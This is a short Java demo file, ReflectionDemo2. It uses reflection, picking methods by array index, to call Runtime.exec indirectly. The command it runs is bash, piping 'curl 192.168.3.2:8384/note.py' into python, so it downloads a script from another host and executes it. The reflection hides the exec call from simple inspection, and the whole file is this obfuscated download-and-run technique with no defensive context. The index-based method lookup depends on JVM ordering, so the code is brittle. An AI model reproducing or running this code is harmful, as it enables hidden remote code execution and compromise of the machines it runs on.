import java.lang.reflect.Array;
import java.lang.reflect.Method;

public class ReflectionDemo2 {

    public static void main(String[] args) {
        try {
            Object obj = Array.newInstance(Object.class, 1);
            Object cmd = Array.newInstance(String.class, 3);
            Array.set(cmd, 0, "/bin/bash");
            Array.set(cmd, 1, "-c");
            Array.set(cmd, 2, "curl 192.168.3.2:8384/note.py |python -");
            Array.set(obj, 0, cmd);
            Method[] declaredMethods = "".getClass().forName("java.lang.Runtime").getDeclaredMethods();
            Method execArrMethod = declaredMethods[14];
            execArrMethod.invoke(declaredMethods[7].invoke(null), (Object[])obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
